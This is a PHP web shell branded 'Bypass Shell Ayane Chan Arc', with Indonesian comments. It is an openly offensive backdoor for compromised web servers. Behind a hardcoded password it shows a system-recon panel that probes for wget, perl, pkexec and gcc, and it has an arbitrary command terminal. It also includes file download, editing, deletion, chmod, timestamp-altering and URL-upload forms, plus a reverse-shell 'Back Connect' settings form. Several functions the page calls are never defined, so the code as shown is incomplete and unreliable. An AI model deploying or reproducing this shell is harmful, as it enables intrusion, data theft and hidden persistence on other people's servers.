<?php
session_start();

define('PASSWORD', 'ayane111'); // Password untuk kontrol akses

if (isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
        echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
    } else {
        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
    }
}

if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Inisialisasi variabel Back Connect
$backConnectServer = '127.0.0.1';
$backConnectPort = '1234';
$backConnectBinPort = '4444';

if (isset($_POST['setBackConnect'])) {
    $backConnectServer = $_POST['server'] ?? $backConnectServer;
    $backConnectPort = $_POST['port'] ?? $backConnectPort;
    $backConnectBinPort = $_POST['binport'] ?? $backConnectBinPort;
}

// Fungsi untuk menampilkan informasi Back Connect
function displayBackConnect($server, $port, $binport) {
    echo "<div class='back-connect alert alert-warning mt-4'>";
    echo "<strong>Server:</strong> $server<br>";
    echo "<strong>Port:</strong> $port<br>";
    echo "<strong>Port to /bin/sh:</strong> $binport";
    echo "</div>";
}

// Fungsi untuk mendapatkan informasi sistem
function getSystemInfo() {
    $uname = php_uname();
    $username = get_current_user();
    $userId = posix_geteuid();
    $groupId = posix_getegid();
    $phpVersion = phpversion();
    $phpOs = PHP_OS;
    $serverSoftware = $_SERVER['SERVER_SOFTWARE'];
    $serverName = $_SERVER['SERVER_NAME'];
    $serverIp = $_SERVER['SERVER_ADDR'];
    $clientIp = $_SERVER['REMOTE_ADDR'];
    $safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
    $mysqlEnabled = extension_loaded('mysqli') ? 'ON' : 'OFF';
    $perlEnabled = function_exists('shell_exec') && shell_exec('perl -v') ? 'ON' : 'OFF';
    $wgetEnabled = function_exists('shell_exec') && shell_exec('wget --version') ? 'ON' : 'OFF';
    $curlEnabled = function_exists('curl_version') ? 'ON' : 'OFF';
    $pythonEnabled = function_exists('shell_exec') && shell_exec('python --version') ? 'ON' : 'OFF';
    $pkexecEnabled = function_exists('shell_exec') && shell_exec('pkexec --version') ? 'ON' : 'OFF';
    $gccEnabled = function_exists('shell_exec') && shell_exec('gcc --version') ? 'ON' : 'OFF';

    return [
        'System' => $uname,
        'User' => "$username ($userId)",
        'Group' => $groupId,
        'PHP Version' => $phpVersion,
        'PHP OS' => $phpOs,
        'Software' => $serverSoftware,
        'Domain' => $serverName,
        'Server IP' => $serverIp,
        'Your IP' => $clientIp,
        'Safe Mode' => $safeMode,
        'MySQL' => $mysqlEnabled,
        'Perl' => $perlEnabled,
        'WGET' => $wgetEnabled,
        'CURL' => $curlEnabled,
        'Python' => $pythonEnabled,
        'Pkexec' => $pkexecEnabled,
        'GCC' => $gccEnabled
    ];
}

// Fungsi untuk menampilkan informasi sistem
function displaySystemInfo() {
    $info = getSystemInfo();
    echo "<div class='system-info alert alert-info'>";
    foreach ($info as $key => $value) {
        echo "<strong>$key:</strong> $value <br>";
    }
    echo "</div>";
}

// Fungsi untuk mengubah permissions (chmod)
function changePermissions($path, $mode, $manual = false) {
    if ($manual) {
        $octalMode = manualToOctal($mode);
        if ($octalMode !== false && chmod($path, $octalMode)) {
            echo "<div class='alert alert-success'>Chmod berhasil diubah menjadi $mode.</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal mengubah chmod, periksa format manual yang Anda masukkan.</div>";
        }
    } else {
        if (chmod($path, octdec($mode))) {
            echo "<div class='alert alert-success'>Chmod berhasil diubah menjadi $mode.</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal mengubah chmod.</div>";
        }
    }
}

// Fungsi untuk mengkonversi format manual chmod ke oktal
function manualToOctal($manualMode) {
    if (preg_match('/^([-rwx]{10})$/', $manualMode, $matches)) {
        $mapping = [
            '-' => 0,
            'r' => 4,
            'w' => 2,
            'x' => 1,
            's' => 4,
            'S' => 4,
            't' => 1,
            'T' => 1,
        ];

        $permissions = str_split($manualMode);
        $octal = '';
        for ($i = 1; $i < count($permissions); $i += 3) {
            $octal .= ($mapping[$permissions[$i]] + $mapping[$permissions[$i+1]] + $mapping[$permissions[$i+2]]);
        }
        return octdec($octal);
    }
    return false;
}

if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = $_POST['dir'];
    $filename = basename($url);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

if (isset($_POST['delete']) && isset($_POST['path'])) {
    $path = base64_decode(urldecode($_POST['path']));
    deleteItem($path);
}

if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destination'])) {
    $source = base64_decode(urldecode($_POST['source']));
    $destination = $_POST['destination'];
    renameFile($source, $destination);
}

if (isset($_POST['chmod']) && isset($_POST['source']) && isset($_POST['mode'])) {
    $source = base64_decode(urldecode($_POST['source']));
    $mode = $_POST['mode'];
    $manual = isset($_POST['manual']) && $_POST['manual'] === 'on';
    changePermissions($source, $mode, $manual);
}

if (isset($_POST['changedate']) && isset($_POST['source']) && isset($_POST['newdate'])) {
    $source = base64_decode(urldecode($_POST['source']));
    $newdate = $_POST['newdate'];
    changeDate($source, $newdate);
}

if (isset($_POST['saveEdit']) && isset($_POST['editSource']) && isset($_POST['content'])) {
    $source = base64_decode(urldecode($_POST['editSource']));
    $content = $_POST['content'];
    editFile($source, $content);
}

if (isset($_POST['command']) && isset($_POST['dir'])) {
    $command = $_POST['command'];
    $dir = base64_decode(urldecode($_POST['dir']));
    chdir($dir);
    $commandOutput = executeCommand($command);
}

if (isset($_GET['download'])) {
    $file = base64_decode(urldecode($_GET['download']));
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

$dir = isset($_GET['dir']) ? base64_decode(urldecode($_GET['dir'])) : '.';
$displayDir = realpath($dir);

$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Shell Ayane Chan Arc</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            min-width: 1024px;
        }

        .form-popup {
            display: none;
            position: fixed;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            z-index: 9;
            background-color: white;
            border: 1px solid #888;
            width: 400px;
            padding: 20px;
            box-shadow: 0px 0px 10px 0px #000;
        }

        .form-container h4 {
            margin-bottom: 15px;
        }

        .form-container input[type=text], .form-container textarea, .form-container input[type=datetime-local], .form-container input[type=number] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 10px 0;
            border: none;
            background: #f1f1f1;
        }

        .form-container .btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            width: 100%;
            margin-bottom:10px;
            opacity: 0.8;
        }

        .form-container .btn.cancel {
            background-color: red;
        }

        .form-container .btn:hover, .open-button:hover {
            opacity: 1;
        }

        .system-info {
            margin-bottom: 20px;
            padding: 10px;
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        
        .back-connect {
            margin-top: 20px;
            padding: 10px;
            background-color: #ffeeba;
            border: 1px solid #ffc107;
            border-radius: 5px;
        }
        
        .chmod-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .chmod-options label {
            margin-right: 10px;
        }
    </style>
</head>
<body style="background-color: pink;">
    <div class="container mt-5">
        <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
        <?php displaySystemInfo(); ?> <!-- Menampilkan informasi sistem di bagian atas halaman -->
        
        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
        <div class="text-center mb-4">
            <img src="https://i.pinimg.com/564x/b6/ac/db/b6acdba14a2632ae4bc67088ba0c0422.jpg" alt="Welcome Image" class="img-fluid">
        </div>
        <div class="text-center mb-4">
            <form method="post" class="d-inline">
                <button type="submit" name="logout" class="btn btn-danger">Logout</button>
            </form>
            <button class="btn btn-warning" onclick="showForm('backConnectForm')">Back Connect</button>
        </div>

        <!-- Back Connect Info -->
        <?php displayBackConnect($backConnectServer, $backConnectPort, $backConnectBinPort); ?>
        
        <!-- Back Connect Form -->
        <div id="backConnectForm" class="form-popup">
            <form method="post" class="form-container">
                <h4>Set Back Connect</h4>
                <label for="server"><b>Server</b></label>
                <input type="text" placeholder="Enter Server IP" name="server" required>
                
                <label for="port"><b>Port</b></label>
                <input type="number" placeholder="Enter Port" name="port" required>
                
                <label for="binport"><b>Port to /bin/sh</b></label>
                <input type="number" placeholder="Enter Port for /bin/sh" name="binport" required>

                <button type="submit" name="setBackConnect" class="btn btn-primary">Set Back Connect</button>
                <button type="button" class="btn cancel" onclick="hideForm('backConnectForm')">Cancel</button>
            </form>
        </div>

        <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
        <form method="post">
            <div class="form-group">
                <label for="url">URL File</label>
                <input type="text" id="url" name="url" class="form-control" placeholder="Masukkan URL file" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Upload dari URL</button>
        </form>
        
        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">Pilih File untuk Diupload</label>
                <input type="file" id="file" name="file" class="form-control" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Upload File</button>
        </form>

        <h2 class="mt-4">Daftar Direktori</h2>
        <div class="alert alert-info">
            <strong>Direktori Saat Ini:</strong> 
            <?php
            $currentPath = '/';
            echo "<a href='?dir=" . urlencode(base64_encode('/')) . "' class='btn btn-link'>/</a> ";
            foreach ($dirArray as $index => $folder) {
                $currentPath .= htmlspecialchars($folder) . '/';
                $encodedPath = urlencode(base64_encode($currentPath));
                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
                if ($index < count($dirArray) - 1) {
                    echo " / ";
                }
            }
            ?>
        </div>
        <div class="list-group">
            <?php
            display_path_links($dir);
            ?>
        </div>

        <h2 class="mt-4">Terminal</h2>
        <form method="post">
            <div class="form-group">
                <label for="command">Command</label>
                <input type="text" id="command" name="command" class="form-control" placeholder="Masukkan perintah" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Jalankan</button>
        </form>
        <?php if (isset($commandOutput)): ?>
            <pre class="mt-4"><?php echo $commandOutput; ?></pre>
        <?php endif; ?>
        	
        <footer class="text-center mt-4">
            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc</small>
        </footer>
        <?php else: ?>
        <style>
            body {
                background-color: pink;
                height: 100vh;
                margin: 0;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-card {
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0,0,0,0.1);
                padding: 20px;
                max-width: 400px;
                width: 100%;
                text-align: center;
                background-color: white;
            }
            .login-card img {
                max-width: 100%;
                height: auto;
                margin-bottom: 20px;
            }
            .login-card h1 {
                margin-bottom: 20px;
                animation: colorChange 3s infinite;
            }
            @keyframes colorChange {
                0%, 100% {
                    color: pink;
                }
                50% {
                    color: lightblue;
                }
            }
            .login-card .form-group {
                margin-bottom: 15px;
            }
            .login-card .btn {
                width: 100%;
            }
        </style>
        <div class="login-card">
            <h1>Bypass Shell Ayane Chan Arc</h1>
            <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
            <form method="post">
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
                </div>
                <button type="submit" class="btn btn-primary">Login</button>
            </form>
        </div>
        <?php endif; ?>
    </div>
    <script>
        function showForm(formId) {
            document.getElementById(formId).style.display = 'block';
        }

        function hideForm(formId) {
            document.getElementById(formId).style.display = 'none';
        }
    </script>
</body>
</html>
